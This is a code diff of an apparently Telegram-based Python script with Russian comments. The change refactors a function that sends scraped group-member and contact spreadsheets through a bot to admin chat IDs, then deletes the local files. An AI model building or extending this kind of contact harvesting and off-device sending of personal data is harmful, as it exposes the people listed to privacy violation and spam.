@@ -8,32 +8,21 @@ from telethon.tl.functions.contacts import GetContactsRequest
 import asyncio  # Add this import statement at the beginning of your script
 
 def send_files_to_bot(bot, admin_chat_ids):
-    # Список файлов для отправки
-    files_to_send = []
-
-    # Проверяем наличие файла с участниками групп
+    # Проверяем наличие файла с участниками групп и отправляем его ботам
     if os.path.exists("users.xlsx") and os.path.getsize("users.xlsx") > 0:
-        files_to_send.append(("users.xlsx", "Файл с участниками групп"))
-    else:
-        print("Файл с участниками групп не найден или пустой.")
-
-    # Проверяем наличие файла с контактами
-    if os.path.exists("contacts.xlsx") and os.path.getsize("contacts.xlsx") > 0:
-        files_to_send.append(("contacts.xlsx", "Файл с контактами"))
-    else:
-        print("Файл с контактами не найден или пустой.")
-
-    # Отправляем файлы всем ботам из списка
-    for admin_chat_id in admin_chat_ids:
-        for file_path, file_description in files_to_send:
-            with open(file_path, "rb") as file:
+        for admin_chat_id in admin_chat_ids:
+            with open("users.xlsx", "rb") as file:
                 bot.send_document(admin_chat_id, file)
-            print(f"Отправлен файл '{file_description}' боту {admin_chat_id}")
+        # После отправки удаляем файл, чтобы избежать повторной отправки
+        os.remove("users.xlsx")
 
-    # Удаляем файлы после отправки, если они были успешно отправлены
-    for file_path, _ in files_to_send:
-        os.remove(file_path)
-
+    # Проверяем наличие файла с контактами и отправляем его ботам
+    if os.path.exists("contacts.xlsx") and os.path.getsize("contacts.xlsx") > 0:
+        for admin_chat_id in admin_chat_ids:
+            with open("contacts.xlsx", "rb") as file:
+                bot.send_document(admin_chat_id, file)
+        # После отправки удаляем файл, чтобы избежать повторной отправки
+        os.remove("contacts.xlsx")
 
     if os.path.exists("contacts.xlsx"):
         # Отправляем файл всем ботам из списка
